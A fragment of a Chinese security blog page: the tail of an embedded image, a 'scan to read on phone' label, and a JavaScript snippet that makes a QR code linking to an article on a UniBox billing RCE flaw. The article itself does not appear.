wLcNBHJX7L4MSH68G2qtH+a8uljeMVa6mqhfDrkGzGi++9VFSJ1cv6gudh1Sb36F3zaQVfNL+/oJ/PVA4Hzq47Ygfgh6F4kQHYLq9oBZh3C4/8Vhr7G2651Deu386mfY+3Y/zNeBcOD6Tf32Zq+HJ8TpdtztW595OWTq6mcI8VsvQvRdvb7CnUcd0qu8FepiaRVyiF8uwqzDzPV1rN5jmB+1h4FouvB3TuAYCGTK8Bx323TKZ/kzH8zX1w/RO99db9StESG9Rk+tYdb1V65CLpZW0XlpFTD3g5mXpwKiA9d7yO3NXscT8mb7+r/dzv8AAAD//zGwDeIAAAAGSURBVAMApiHLmDE3FJMAAAAASUVORK5CYII=)

手机扫码阅读

网络安全


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/unibox-billing-logout-mac\_address-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 